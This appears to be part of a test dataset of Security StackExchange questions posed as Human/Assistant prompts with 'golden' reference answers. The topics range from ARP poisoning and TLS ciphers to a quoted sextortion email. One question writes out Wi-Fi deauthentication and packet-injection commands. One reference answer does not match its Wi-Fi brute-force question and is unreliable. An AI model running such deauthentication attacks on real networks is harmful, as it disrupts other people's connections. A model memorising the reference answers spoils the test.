        "prompt": "\n\nHuman: <p>I'm trying to put some anomoly detection in place and I'm looking at referrer data (I know that this is optional, and can be fudged in some circumstances). But I'm seeing too many cases of what I believe to be false positives.</p>\n\n<p>From <a href=\"http://www.ietf.org/rfc/rfc2616.txt\" rel=\"nofollow\">rfc2616</a>:</p>\n\n<pre><code>The Referer[sic] request-header field allows the client to specify,\nfor the server's benefit, the address (URI) of the resource from\nwhich the Request-URI was obtained\n</code></pre>\n\n<p>I take this to mean that the referer should be populated only when the request is generated from a link, form submission, ajax request, or related content <em>explicitly</em> containing the target URL. i.e. if the user navigates to my site using a bookmark, manually entered address or via another page site (not counting the possibility that this might issue a 30x redirect) then I shouldn't see the page they were on previously.</p>\n\n<p>But I see a large number of cases where the URL supplied as the referrer has no link to my site. Further, many of these referrers are reputable operations (including large banks) who should be protected against XSS type attacks, therefore it's unlikely that the cases I see were due to the user accessing a modified page.</p>\n\n<p>I am aware that there are long outstanding issues on iPads and iPhones (CVE-2009-2797, CVE-2008-3171) which give rise to this behaviour (before I started filtering these out, ipads and iphones were disproprortinately represented in the output) however I am seeing these oddities for MSIE, Firefox and 26, and very occassionally Google Chrome.</p>\n\n<p>I've been unable to replicate the behaviour on Firefox (same version as reported from my production data) using </p>\n\n<ul>\n<li>a simple href (referer is prev page)</li>\n<li>a form (both GET and POST) (referer is previous page)</li>\n<li>a change to window.location via javascript (referer is prev page)</li>\n<li>an img ref (referer is prev page)</li>\n<li>bookmark (no referer)</li>\n<li>manually entered location (no referer)</li>\n</ul>\n\n<p>I've not looked at Greasemonkey type scripts - can anyone advise if these will give rise to this behaviour? I don't see any evidence of pre-flighting which would imply a CORS. </p>\n\n<p>Is there something else I am missing? </p>\n\n\nAssistant:",
        "golden_answer": " <p>It's a common method of (SEO) spamming to give fake referrers with the hope of being listed in some place or another, this might explain some of the entries.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Wireshark can detect these kind of activites, and warn us by a 'duplicated ip address' message. Why doesn't the router act like this?\nThe other way is to check the cache, and don't allow two different ip address for a single mac address.</p>\n\n<p>I think it is easy to prevent, but network hosts are just let it happen. Why?</p>\n\n\nAssistant:",
        "golden_answer": " <blockquote>\n  <p>The other way is to check the cache, and don't allow two different ip address for a single mac address.</p>\n</blockquote>\n\n<p>I want to start here because this is a <em>very bad idea</em>. There are many situations where a single MAC may have multiple valid IP addresses, especially in an IPv6 world.</p>\n\n<blockquote>\n  <p>Wireshark can detect these kind of activites, and warn us by a 'duplicated ip address' message.</p>\n</blockquote>\n\n<p>Wireshark is highlighting in these cases a IP address potentially has more than one MAC address in the traffic. This <em>may be</em> a duplicate IP address, but it also may be a valid configuration.</p>\n\n<blockquote>\n  <p>Why doesn't the router act like this? ... I think it is easy to prevent, but network hosts are just let it happen. Why?</p>\n</blockquote>\n\n<p>It all depends on the router, network and configuration in question. </p>\n\n<p>Many routers will detect and log/alert when there is the possibility of a duplicate IP address. Some routers will not update an ARP entry in their tables until the old entry ages out or is manually removed.</p>\n\n<p>Hosts can be configured to handle this in different ways as well, depending on the OS. </p>\n\n<blockquote>\n  <p>Why isn't there a defense system against ARP poisoning?</p>\n</blockquote>\n\n<p>There is, it is often called <em>dynamic ARP inspection</em> or DAI and it is present as a feature on many platforms. If you use an enterprise network solution, it is almost guaranteed to be there in some form; it becomes less common as you move down towards SOHO and consumer devices, but can still be found in some, often with simplified configuration and terminology (i.e. there may be a simple check box to enable a number of end point security features).</p>\n\n<p>DAI often works in conjunction with features such as DHCP snooping (which helps to prevent rogue DHCP servers) and works by building a \"binding\" table between client IP and MAC addresses. If the information provided by an ARP packet doesn't match an entry in the binding table, it is discarded.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p><a href=\"http://www.bbc.co.uk/news/uk-politics-26632863\">The UK is getting a new £1 coin</a>.  Its designers, the Royal Mint, claim that unlike current coins, it includes built in <a href=\"http://www.royalmint.com/business/circulating-coin/isis\">technology</a> for high speed authentication and verification everywhere from ATMs to vending machines and point-of-sale.</p>\n\n<p>How does this work?  Something like RFID?  Does this mean the coins (and therefore their users) can be tracked?</p>\n\n\nAssistant:",
        "golden_answer": " <p>They are using a system called <a href=\"https://web.archive.org/web/20151027211647/http://www.royalmint.com/corporate/circulating-coin/Integrated-Secure-Identification-Systems\" rel=\"noreferrer\">ISIS</a> which also has some more details available <a href=\"https://web.archive.org/web/20140325214810/http://www.currency-news.com/best-new-coin-innovation-2013-finalist-02\" rel=\"noreferrer\">here</a>.  It appears to be a form of micro-tagging embedded within the currency itself (based on the comment the same technology has been used in fuels and perfumes).  </p>\n\n<p>Basically, a specially manufactured particle is constructed and then mixed as an additive with the coin.  This additive can later be detected automatically.  Since the composition of the additive is unknown, it can't be reproduced easily but yet machines can read the signature of it.</p>\n\n<p>The tagging technology can be used to tag specific coins (this is done for some high end unique items that are tagged), but it would generally be very expensive to do so.  It is far more likely that a standard formulation is used for all coins of a given value.  It would also still very likely require that the coin be directly handled to read as it is not a radio based technology.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>How does your company track the vulnerability management information that happens between receiving a vulnerability scan report and remediating a vulnerability?</p>\n\n<p>Given the following example:</p>\n\n<pre><code>Scan A detects\n  Vuln 1\n  Vuln 2\n  Vuln 3\n</code></pre>\n\n<p>You decide not to remediate Vuln 2 and 3, but you do remediate Vuln 1. At a later date you conduct another scan (Scan B):</p>\n\n<pre><code>Scan B detects\n  Vuln 2\n  Vuln 3\n  Vuln 4\n</code></pre>\n\n<p>Putting the vulnerability information into a large master spreadsheet along with remediation decisions (whether or not to remediate) and manually updating it would allow you to keep track of vulnerability decisions so you're not constantly re-evaluating the same vulnerabilities (Vuln 2 and 3 in the example above) from scan to scan.</p>\n\n<p>Is it common practice to have a large master spreadsheet that contains the relevant information for vulnerabilities found by scans (target, vulnerability, risk ranking, remediation decisioning notes, etc...) that is manually kept up to date across vulnerability scans or is there some other common practice or well-known tool(s) that does a better job tracking this information?</p>\n\n\nAssistant:",
        "golden_answer": " <p>I am using Database (Based on mysql and PHP). It is more valuable and easy to maintain. I don't like to use excel Spreadsheet. Therefore i have database and updates are done by manually. </p>\n\n<p>All attributes which you have mentioned are included in  my database and additionally i have been added how remediation was done or why it was not done.</p>\n\n<p>Best Practices of Vulnerability Recordings are below.</p>\n\n<ul>\n<li>Record all related Details about Vulnerability and remediate action.</li>\n<li>do vulnerability assessment at least once a quarter, and compare with\nprevious result. </li>\n<li>According to second line, your records should be able to compare with previous result. therefore DB is more useful than excel sheet.</li>\n<li>Do VA with Different methods and all details are needs to be recorded separately.</li>\n<li>Record analysis are very important, Again database more helpful than excel sheet.</li>\n<li>when you conduct Audit, result needs to be accessible without any delay and again database will be provided more flexible accessibility than excel sheet.</li>\n<li>Main thing, Vulnerability Scan results are very sensitive and confidential data. It needs to be stored in high secure environment. Database will be provided high secure environment than excel sheet.</li>\n</ul>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Hello I recently started playing with aircrack-ng and I have few questions.</p>\n\n<ol>\n<li>When I'm starting with the whole process insted of turning on the monitor mode I do the opposite <code>airmon-ng stop wlan0</code> and listen with <code>airodump-ng wlan0</code>. I do this because when I'm listening using <code>airodump-ng mon0</code> (after i <code>airmon-ng start wlan0</code> of course) I can't get a handshake, and with wlan0 I can. Is this normal or am I missing something?</li>\n<li>I read on their website that there are some wireless cards that can only listen to packets, and can't inject them. I can't seem to deauth a user on some network so I'm wondering if it's a problem with my card or am I doing something wrong? I tried to deauth on a few different ways:\n\n<ul>\n<li><code>aireplay-ng -0 0 -a *BSSID* wlan0</code></li>\n<li><code>aireplay-ng -0 0 -a *BSSID* -c *DMAC* wlan0</code></li>\n<li><code>mdk3 wlan0 b -n *DMAC*</code></li>\n</ul></li>\n</ol>\n\n<p>Also when I run <code>aireplay-ng -9 wlan0</code> I get 0/30 successful packets injected on every AP.</p>\n\n<p>I can't seem to determ if my card is capable of injecting packets. The command <code>lspci -nn | grep 0280</code> gives me <em>02:00.0 Network controller [0280]: Intel Corporation Wireless 3160 [8086:08b4] (rev 93)</em></p>\n\n\nAssistant:",
        "golden_answer": " <p>Okay friend, here's some notes:</p>\n\n<p>As for the handshake problem, from experience, it might be the following:</p>\n\n<ul>\n<li>You're not close enough to the router, there is a chance that you'll not capture the handshake if the client is too close to the AP and the monitor mode device is relatively far.</li>\n<li>A hardware issue, your network device is old and not compatible, so it can't capture packets from another protocols. For example if your device running 802.11g and the network is 802.11n</li>\n</ul>\n\n<p>Solution: First, try to capture the handshake from different physical positions, if it doesn't work, try another WiFi device.</p>\n\n<p><strong>Note:</strong></p>\n\n<p>Some answer said to <code>kill</code> processes that interfere with airmon-ng. Don't use the <br>command <code>airmon-ng check kill</code> because you'll stop the network-manager application.</p>\n\n<p>Don't use the previous command to fix the fixed channel -1 error, instead, use the following commands when starting monitor mode:</p>\n\n<ul>\n<li>airmon-ng start wlan0</li>\n<li>ifconfig wlan0mon down</li>\n<li>iwconfig wlan0mon mode monitor</li>\n<li>ifconfig wlan0mon up</li>\n</ul>\n"
    },
    {
        "prompt": "\n\nHuman: <p>In  <a href=\"http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.211.8742&amp;rep=rep1&amp;type=pdf\" rel=\"nofollow noreferrer\">A Comparison of Market Approaches to Software Vulnerability Disclosure (2006)</a>, Rainer Böhme describes the profound role of economic &quot;market failure&quot; in the industry dynamics that hinder software security.  He also describes 4 kinds of markets that can help:</p>\n<ul>\n<li>Bug challenges, like payments by Mozilla and Google for security bugs</li>\n<li>Vulnerability brokers, aka “vulnerability sharing circles”, e.g. CERT or iDefense</li>\n<li>Exploit derivatives, an application of binary markets to security events</li>\n<li>Cyber-insurance</li>\n</ul>\n<p>The latter two seem to be the most promising.  Have either of these ideas matured since then, and are they available anywhere?</p>\n<p>See also</p>\n<ul>\n<li><p><a href=\"http://digitalcommons.law.yale.edu/yjolt/vol9/iss1/5/\" rel=\"nofollow noreferrer\">Exploit Derivatives &amp; National Security - Micah Schwalb - 9 YALE J. L. &amp; TECH. 162 (2007)</a></p>\n</li>\n<li><p><a href=\"https://security.stackexchange.com/questions/4086/\">Which companies facilitate payment in return for vulnerability disclosure?</a></p>\n</li>\n</ul>\n<p><em><strong>Update</strong></em>:</p>\n<ul>\n<li><a href=\"http://www.crn.com.au/News/256275,new-index-a-step-to-trading-it-security-risks.aspx\" rel=\"nofollow noreferrer\">New index a step to trading IT security risks - CRN Australia</a> which talks about the <a href=\"http://www.cybersecurityindex.org/\" rel=\"nofollow noreferrer\">Index of Cyber Security</a></li>\n</ul>\n<p><em><strong>Update 2</strong></em>: I just ran across Tyler Moore's paper on misaligned incentives and information asymmetries, and getting ISPs to take more responsibility: <a href=\"http://www.cs.brown.edu/courses/csci1950-p/sources/lec27/Moore.pdf\" rel=\"nofollow noreferrer\">Introducing the Economics of Cybersecurity: Principles and Policy Options</a> (pdf) National Academies Press, 2010</p>\n\n\nAssistant:",
        "golden_answer": " <p>Of these market types, the first two can benefit individual security researchers, but must be initiated by the vendor. Therefore, only vulnerability information regarding vendors participating in such a solution would be valuable under such a mechanism. Depending on the level of participation, this could deeply hamper a security researcher. Vulnerability brokers and cyber-insurance don’t have an immediate incentive for the individual researcher. It\nwould be difficult to leverage a found vulnerability into income under these two systems.</p>\n\n<p>Due to the secretive nature of the market at the present time, it is difficult for them to find a buyer, determine a price for the information, prove the value of the vulnerability, and exchange the goods for money. On top of this, at any point in this process, the vulnerability may be announced by someone else, making the discovery worthless.\nSome solutions exist which help to alleviate some of these problems, however their actual implementation remains far off in the future.</p>\n\n<p>Take a look at this paper: <a href=\"http://securityevaluators.com/files/slides/cmiller_auscert2008.pdf\" rel=\"nofollow\">http://securityevaluators.com/files/slides/cmiller_auscert2008.pdf</a></p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I've been fiddling with a locally encrypted disk image for years and I think it's finally time to use a password manager. Keepass is what I want to go with but I'm not a fan of the UI of the official project.</p>\n\n<p>I noticed there's a good number of clients supporting keepass's database format, but how can I assess if one is safe to use? If I disable network access to the client could I be reasonably sure it won't phone home with my secrets?</p>\n\n\nAssistant:",
        "golden_answer": " <p>How do you know how to trust any given KeePass implementation? The same ways you know how to trust <em>any</em> software. For me, these are factors I consider:</p>\n\n<ul>\n<li>Open Source\n\n<ul>\n<li>All of the major ports are open.</li>\n<li>Probably avoid random Windows Store apps without source available.</li>\n</ul></li>\n<li>Audited by a 3rd party\n\n<ul>\n<li>AFAIK, only the official version has this. I could be wrong.</li>\n</ul></li>\n<li>Active, transparent, development\n\n<ul>\n<li>The official version has active development, but it's pretty opaque.</li>\n<li>KeePassX, if I understand correctly, is no longer very active.</li>\n<li>Several of the Android and iOS apps seem abandoned.</li>\n<li>KeePassXC and KeeWeb are both active and transparent.</li>\n</ul></li>\n<li>Active community\n\n<ul>\n<li>I think all the big ones on a computer have this.</li>\n<li>Smartphone apps: hard to say.</li>\n</ul></li>\n<li>Location: depending on where <em>you</em> are located, knowing whether the software is mostly developed in Germany vs. Russia vs. the United States of America may make a difference in your trust.\n\n<ul>\n<li>KeePass itself is developed in Germany</li>\n<li>I don't know about any of the others. I know I've looked up the Android apps I've used and the browser extensions but don't remember them.</li>\n</ul></li>\n<li>Developer: is it only one person (who could be compromised), a community (who can police other members as needed), or a company (who can be held liable by others)?\n\n<ul>\n<li>Honestly I think KeePassXC does better in this area.</li>\n<li>Official KeePass has only a single maintainer, and I think KeeWeb as well.</li>\n<li>I think all the smartphone apps have only a single maintainer.</li>\n</ul></li>\n<li>Popularity: how likely is it that a compromise would be noticed by someone and reported on by tech news?\n\n<ul>\n<li>KeePass itself would definitely be noticed and reported.</li>\n<li>KeePassXC, by virtue of being a community project, stands a decent chance in my opinion as well.</li>\n<li>I'm unsure about KeeWeb. As far as I know it sees much less use.</li>\n<li>For smartphone apps, those mentioned specifically in the KeePass forums on a regular basis are very popular, but probably less likely to be noticed in the tech news sites.</li>\n</ul></li>\n</ul>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I am doing research in the security of cloud computing.</p>\n\n<p>The purpose of the following questions is to understand the relationship between \"risk analysis\" and \"threat modeling\":</p>\n\n<ol>\n<li>Do we usually analyze the risk before making the threat model?</li>\n<li>The concept of threat modeling is a bit vague to me. Can I get an example of an existing threat model?</li>\n</ol>\n\n\nAssistant:",
        "golden_answer": " <p>Both terms are very slippery.</p>\n\n<p>There are multiple risk analysis methodologies and they use different vocabulary and different assumptions.  <a href=\"https://en.wikipedia.org/wiki/Factor_analysis_of_information_risk\" rel=\"nofollow noreferrer\">FAIR</a> and the tire swing analogy are a good introduction, and if you can find Tony Cox's video, that is another good source.  <a href=\"http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-37r1.pdf\" rel=\"nofollow noreferrer\">NIST 800-37</a> is an alternative methodology.  OWASP has another.  </p>\n\n<p>Threat modelling is going through a renaissance - I did a google search and turned up the <a href=\"https://www.owasp.org/index.php/Threat_Risk_Modeling\" rel=\"nofollow noreferrer\">OWASP</a> link that @Limit provided (and Limit deserves the credit because that is your best, first source) and a half dozen others.  But there are <a href=\"http://csrc.nist.gov/publications/drafts/800-154/sp800_154_draft.pdf\" rel=\"nofollow noreferrer\">NIST threat models</a>, and some really creative thinking about a hierarchy of indicators of compromise. (You'll have to search the blogosphere - <a href=\"https://www.hexiscyber.com/sites/default/files/managing-indicators-of-compromise.pdf\" rel=\"nofollow noreferrer\">Bloor</a>, <a href=\"http://openioc.org/\" rel=\"nofollow noreferrer\">OpenIOC</a>, <a href=\"http://blogs.gartner.com/anton-chuvakin/2014/03/31/on-threat-intelligence-management-platforms/\" rel=\"nofollow noreferrer\">Chuvakin</a> - I can't find the one I want that clearly shows a hierarchy diagram).    The summary here is that we are at a tipping point - we now can collect enough data and do enough analysis to leverage threat intelligence to produce real gains in security. A decade ago, threat modelling was mostly theoretical and didn't have as strong an impact. </p>\n\n<p>Personally I do risk assessment &amp; analysis first, but I have to do a preliminary threat model during the risk analysis.  My tech lead does the opposite, but he has years of doing advanced threat modelling. </p>\n\n<p>I can't give you an example of a threat model - threat models are expensive to produce and we don't give those away.  But if you know that 30% of the malware coming into your network use one malware toolset, you can configure your defenses to take advantage of that.  Or if you know that across all the different malware campaigns, 70% of them attempt exfiltration as the payload/mission, then that will influence how you invest and configure your defenses.  Threat models tell you what your adversary wants; if you know what the adversary wants, you have the opportunity to more effectively deny the adversary.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>What is the difference between an \"Information Security Policy\" and a \"Cybersecurity Strategy\"?</p>\n\n<p>I had an argument about this with my management and whilst some think that its basically the same thing, others were adamant that the policy is different to the strategy. </p>\n\n\nAssistant:",
        "golden_answer": " <p>There is a massive difference between \"Information Security Policy\" and a \"Cybersecurity Strategy\". As the name suggests they are policies and strategies respectively and the management often gets confused between the both. However I believe following points will help explaining the difference. </p>\n\n<p>An information Security policy is an individual document which will:</p>\n\n<ol>\n<li><p>Enumerate the elements that constitute IT security or information security.</p></li>\n<li><p>Explain the need of IT security.</p></li>\n<li><p>Categorize the various types of IT data, i.e. equipment, and processes subject to this policy.</p></li>\n<li><p>Indicate, in broad terms, the information security responsibilities of the various roles in which each member of the organization may function.</p></li>\n<li><p>Indicate appropriate levels of security through standards and guidelines.</p></li>\n</ol>\n\n<p>Where as a Cybersecurity Strategy will comprise of But not limited to </p>\n\n<ol>\n<li><p>Information Security Policy</p></li>\n<li><p>Information Sensitivity Policy </p></li>\n<li><p>Incident Response and Disaster Recovery Plans </p></li>\n<li><p>Change control procedure</p></li>\n<li><p>Configuration Standards </p></li>\n<li><p>Many more policies, guidelines, standards etc which will collectively contribute in how the organization will anticipate/respond to a Cybersecurity threat/incident. </p></li>\n</ol>\n\n<p>I do understand that some of the elements will be highlighted in Information Security Policy but looking at the bigger picture not everything will be covered. Hope this helps in anyway. </p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I can connect to my server in practically every browser except for Internet Explorer and I cannot figure out why.</p>\n\n<p>I am resolving SSL on AWS Elastic Load Balancer (ELB), which is configured to use the following ciphers:</p>\n\n<pre><code>DHE-RSA-AES256-GCM-SHA384\nDHE-RSA-AES128-GCM-SHA256\nDHE-RSA-AES256-SHA256\nDHE-RSA-AES128-SHA256\nDHE-DSS-AES256-GCM-SHA384\nDHE-DSS-AES128-GCM-SHA256\nDHE-DSS-AES256-SHA256\nDHE-DSS-AES128-SHA256\nDHE-RSA-AES256-SHA\nDHE-RSA-AES128-SHA\nDHE-DSS-AES256-SHA\nDHE-DSS-AES128-SHA\n</code></pre>\n\n<p>I ran an SSL Labs server test <a href=\"https://www.ssllabs.com/ssltest/analyze.html\" rel=\"nofollow\">1</a> and the simulated handshake section passed every browser except all versions of IE, which all failed:</p>\n\n<pre><code>IE 11 / Win 8.1 Protocol or cipher suite mismatch   Fail3\nFail3: Only first connection attempt simulated. Browsers tend to retry with a lower protocol version.\n</code></pre>\n\n<p>I tried connecting to the server using IE11 and IE10 and neither worked. I was able to connect to the server using Chrome, Firefox, Safari (v6 and v7).</p>\n\n<p>IE11 supports TLS v1.2, v1.1, and v1.0, so it should be able to use one of the configured ciphers, right?</p>\n\n\nAssistant:",
        "golden_answer": " <blockquote>\n<p>IE11 supports TLS v1.2, v1.1, and v1.0, so it should be able to use one of the configured ciphers, right?</p>\n</blockquote>\n<p>No. The only cipher suite <a href=\"https://www.rfc-editor.org/rfc/rfc5246#section-9\" rel=\"nofollow noreferrer\">mandated by RFC 5246</a> is (in OpenSSL parlance) <code>AES128-SHA</code>. (I don't <em>think</em> any later RFCs added more.)</p>\n<p>Read the SSL Labs client reports for <a href=\"https://www.ssllabs.com/ssltest/viewClient.html?name=IE&amp;version=7&amp;platform=Vista\" rel=\"nofollow noreferrer\">IE 7/Vista</a> and <a href=\"https://www.ssllabs.com/ssltest/viewClient.html?name=IE&amp;version=11&amp;platform=Win%208.1\" rel=\"nofollow noreferrer\">IE 11/Win8.1</a>. IE supports DHE -- but only with DSA certicates. However, it does support <strong>ECDHE</strong> with RSA (and ECDSA) certificates.</p>\n<p>You need to enable a cipher suite supported by IE, as listed above by SSL Labs. IE 7-10 support TLS 1.0 and the cipher suites <code>ECDHE-RSA-AES128-SHA</code> and <code>ECDHE-RSA-AES256-SHA</code>. IE 11 also adds support for TLS 1.2 and <code>ECDHE-RSA-AES128-SHA256</code>. If the ELB platform doesn't support ECDHE, your only option is to enable some old non-PFS cipher suite like <code>AES128-SHA</code>.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>(I made a throwaway to ask this question, since this situation is pretty embarrassing)</p>\n\n<p>Earlier today I started receiving emails threatening to send embarrassing video of me to all my contacts unless I pay a ransom. When I first saw this message I did briefly panic and consider paying the ransom, but on reflection I'm wondering if this is a plausible threat. I mean, the password they sent as evidence is real, and to my embarrassment I did visit a porn site a week ago because I was bored.</p>\n\n<p>That said, the claimed attack vector seems unlikely to me, and they could have gotten the password from a data breach on an unsecure website (it's a password I use on various forums, not banks or anything). I'm aware of the possibility of keylogging and your webcam being hijacked by a virus, but they're claiming to have done that simply because I visited their website. Is that really possible?</p>\n\n<p>If this is a new attack vector, it seems pretty serious. All an attacker needs is for me to visit a malicious website, not even download anything?</p>\n\n<p>Here is the full email I received:</p>\n\n<blockquote>\n  <p>I know REDACTED is your passphrase. Lets get right to point. You don't\n  know me and you are probably thinking why you are getting this e mail?\n  None has compensated me to check about you. </p>\n  \n  <p>Well, I actually installed a malware on the xxx streaming (porn) site\n  and guess what, you visited this web site to have fun (you know what I\n  mean). When you were viewing videos, your web browser started out\n  operating as a Remote control Desktop having a keylogger which gave me\n  accessibility to your display and also webcam. Right after that, my\n  software gathered your complete contacts from your Messenger,\n  Facebook, and e-mail account. After that I made a video. 1st part\n  displays the video you were watching (you've got a good taste : )),\n  and next part displays the recording of your cam, yeah it is u. </p>\n  \n  <p>You have got two different choices. We are going to read up on these\n  possibilities in aspects: </p>\n  \n  <p>First solution is to skip this message. In this instance, I am going\n  to send out your video to each one of your contacts and then just\n  think concerning the shame that you receive. And as a consequence if\n  you happen to be in a loving relationship, exactly how it will affect?</p>\n  \n  <p>2nd choice should be to give me $3000. Lets refer to it as a donation.\n  Subsequently, I will straight away erase your video. You will resume\n  your daily routine like this never took place and you would never hear\n  back again from me. </p>\n  \n  <p>You will make the payment by Bitcoin (if you don't know this, search\n  \"how to buy bitcoin\" in Google). </p>\n  \n  <p>BTC Address: 16u9dNXj1WRTu4aEiXREXjD1afqjELXs1S  [case-sensitive, copy\n  &amp; paste it] </p>\n  \n  <p>Should you are wondering about going to the law, okay, this e mail\n  cannot be traced back to me. I have covered my actions. I am also not\n  attempting to demand so much, I wish to be compensated. </p>\n  \n  <p>You now have one day in order to make the payment. I have a specific\n  pixel in this mail, and now I know that you have read through this e\n  mail. If I don't receive the BitCoins, I will definately send your\n  video to all of your contacts including relatives, colleagues, and so\n  on. However, if I do get paid, I will erase the recording immediately.\n  If you need evidence, reply Yes! then I will send out your video to\n  your 5 friends. This is the non-negotiable offer and thus please do\n  not waste my personal time &amp; yours by responding to this e mail.</p>\n</blockquote>\n\n\nAssistant:",
        "golden_answer": " <p>Hi this is a scam that has been doing the rounds for a bit now do not worry about it :)</p>\n\n<ul>\n<li><a href=\"https://www.cert.govt.nz/businesses-and-individuals/recent-threats/webcam-and-password-blackmail-scam/\" rel=\"noreferrer\">https://www.cert.govt.nz/businesses-and-individuals/recent-threats/webcam-and-password-blackmail-scam/</a></li>\n<li><a href=\"https://krebsonsecurity.com/2018/07/sextortion-scam-uses-recipients-hacked-passwords/\" rel=\"noreferrer\">https://krebsonsecurity.com/2018/07/sextortion-scam-uses-recipients-hacked-passwords/</a></li>\n</ul>\n\n<p>What has happened is your credentials were leaked in one of the many breaches that occur and scammers are using this personal information to try and make you believe that have embarrassing content.</p>\n\n<p>If you look up your password on <a href=\"https://haveibeenpwned.com/\" rel=\"noreferrer\">https://haveibeenpwned.com/</a> you will find a breach. Now what the bad guy has done is find a list of email addresses and credentials and is now emailing trying to make a quick buck with no effort.</p>\n\n<p>My advice is change your credentials and ignore it.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>How is shellcode (the payload) added to an executable file? Assume it is close source.</p>\n\n<p>How does the hacker then get the address of where it is? They need this for when they overwrite the return address...</p>\n\n<p>After the above is clarified, an example of how ASLR helps to prevent this would be appreciated.</p>\n\n<p>This question is for native code.</p>\n\n\nAssistant:",
        "golden_answer": " <p>I recommend reading <a href=\"http://www-inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf\" rel=\"nofollow noreferrer\">Smashing The Stack For Fun And Profit</a> by Aleph One, which includes some examples of how it is done.</p>\n\n<blockquote>\n  <p>How does the hacker then get the address of where it is?</p>\n</blockquote>\n\n<p>By using a debugger and disassembly of the program, examining assembly instructions. One of the particular things of interest, as in the referenced article, is <a href=\"https://stackoverflow.com/questions/79923/what-and-where-are-the-stack-and-heap\">Stack Pointer</a>:</p>\n\n<blockquote>\n  <p>The CPU has special instructions for pushing values onto the stack and popping them back from the stack. Each push stores the value at the current location of the stack pointer and decreases the stack pointer. A pop retrieves the value pointed to by the stack pointer and then increases the stack pointer (don't be confused by the fact that adding a value to the stack decreases the stack pointer and removing a value increases it.</p>\n</blockquote>\n\n<p>If layout randomization is not enabled, stack pointer is predictable, which means hacker can know how to overflow buffers or where to inject shellcode. In fact, to answer the ASLR part of the question, an example of how can that be useful can be seen in <a href=\"https://security.stackexchange.com/q/83980/121824\">How to find stack pointer for overflow bug?</a></p>\n\n<blockquote>\n  <p>How is shellcode (the payload) added to an executable file?</p>\n</blockquote>\n\n<p>From untrusted input. One example of that is via <a href=\"https://security.stackexchange.com/q/172053/121824\">command-line parameters</a>. It can be combined with other exploits. </p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>The cPanel on my website is being hacked, and I am not sure that the setup my host provides is totally secure. The hack works by intercepting my login. Will an SSL certificate prevent this? If it will, then it would be a lot cheaper than either the host or myself trying to fix a security bug.</p>\n\n<p><strong>Addendum:</strong> SSL did indeed stop the hacking.</p>\n\n\nAssistant:",
        "golden_answer": " <p>If the problem is that somebody intercepts your password by sniffing the unencrypted network traffic then using SSL will help. This means not just installing a SSL certificate but actually using <code>https://</code> instead of <code>http://</code> to access the site.</p>\n\n<p>If the problem is instead a security issue of cPanel or that the attacker grabs your login credentials on your own machine (malware, malicious browser plugin or similar) then SSL will not help since it only protects the transport of the data between browser and server.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>The <a href=\"https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet\" rel=\"noreferrer\">OWASP XSS Prevention Cheat Sheet</a> has a list of locations where untrusted data should never be put:</p>\n\n<blockquote>\n<pre><code> &lt;script&gt;...NEVER PUT UNTRUSTED DATA HERE...&lt;/script&gt;   directly in a script\n\n &lt;!--...NEVER PUT UNTRUSTED DATA HERE...--&gt;             inside an HTML comment\n\n &lt;div ...NEVER PUT UNTRUSTED DATA HERE...=test /&gt;       in an attribute name\n\n &lt;NEVER PUT UNTRUSTED DATA HERE... href=\"/test\" /&gt;   in a tag name\n\n &lt;style&gt;...NEVER PUT UNTRUSTED DATA HERE...&lt;/style&gt;   directly in CSS\n</code></pre>\n</blockquote>\n\n<p>I understand why data shouldn't be put into the other 4 places, but what is the danger of putting user input into HTML comments? I would think that encoding <code>&gt;</code> would be enough to prevent any attacks. Is there a way to execute JavaScript inside a HTML comment? Or a different way to exit HTML comments without <code>&gt;</code>?</p>\n\n\nAssistant:",
        "golden_answer": " <p>The relevant entries in the <a href=\"https://html5sec.org/\">HTML5 Security Cheatsheet</a> are:</p>\n\n<ul>\n<li>Ending HTML comments with a backtick character: <a href=\"https://html5sec.org/#133\">html5sec#133</a> (IE6, IE8) </li>\n<li>Injecting XSS or with a conditional comment <a href=\"https://html5sec.org/#115\">html5sec#115</a> (older IE, IE quirks mode)</li>\n</ul>\n\n<p>Apart from that user input might be used to change this comment into a conditional comment (IE only) and thus change the DOM or block the execution of script after the comment. This could change the behavior of the page in an unintended way.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>What I basically want to do is, perform a test on my Wi-Fi and brute force it instead of a dictionary attack. I googled, and all of them showed me examples of dictionary attack and no bruteforcing.</p>\n\n<p>My password is somewhat like this- <code>aXb2@abc</code>.</p>\n\n<p>I know this can take a lot of time, but since it's my home I can let my computer do the work. Also, is there a better option than bruteforcing this type of passwords?\nI am using Kali Linux 2. Thanks. </p>\n\n\nAssistant:",
        "golden_answer": " <p>No, you cannot determine how close you guessed looking at the hash. A hash function is designed with this in mind: one single changed bit on the input must change a lot of bits on the output. Its called <a href=\"https://en.wikipedia.org/wiki/Avalanche_effect\">Avalanche Effect</a>.</p>\n\n<p>Bellow are SHA1 hashes for some of your example passwords:</p>\n\n<pre><code>cbfdac6008f9cab4083784cbd1874f76618d2a97 - password123\n\nb2e98ad6f6eb8508dd6a14cfa704bad7f05f6fb1 - Password123\n\n2b4bfcc447c3c8726d26c22927a68f511d5e01cc - password124\n\n115b55dcc1cd9a0dfdd60c120e83eaf658c45fc6 - right horse battery staple\n\nabf7aad6438836dbe526aa231abde2d0eef74d42 - correct horse battery staple\n</code></pre>\n\n<p>A single bit change will completely change the hashing result. In fact, in an ideal case for every bit of input change every bit of output will be changed with a 50% probability.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Is it safe to append the user's username to the session ID? The session ID is 32 bytes long generated using a secure PRNG. I encode it using base64 URL to save it in a HttpOnly cookie. The cookie value would be <code>base64URLEncode(rand32bytes.username)</code>.</p>\n\n\nAssistant:",
